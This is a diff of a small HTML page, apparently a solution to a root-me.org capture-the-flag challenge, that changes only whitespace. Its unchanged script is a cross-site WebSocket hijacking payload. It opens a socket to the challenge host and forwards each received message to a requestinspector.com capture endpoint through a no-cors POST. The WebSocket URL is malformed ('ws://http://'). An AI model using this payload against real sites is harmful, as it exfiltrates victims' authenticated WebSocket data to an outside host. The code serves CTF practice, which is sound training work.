@@ -3,10 +3,10 @@
 <body>
   <script>
     var ws = new WebSocket('ws://http://ctf30.root-me.org/ws');
-    ws.onopen = function () {
+    ws.onopen = function() {
       ws.send("READY");
     };
-    ws.onmessage = function (event) {
+    ws.onmessage = function(event) {
       fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?' + event.data, { method: 'POST', mode: 'no-cors', body: event.data });
     };
   </script>
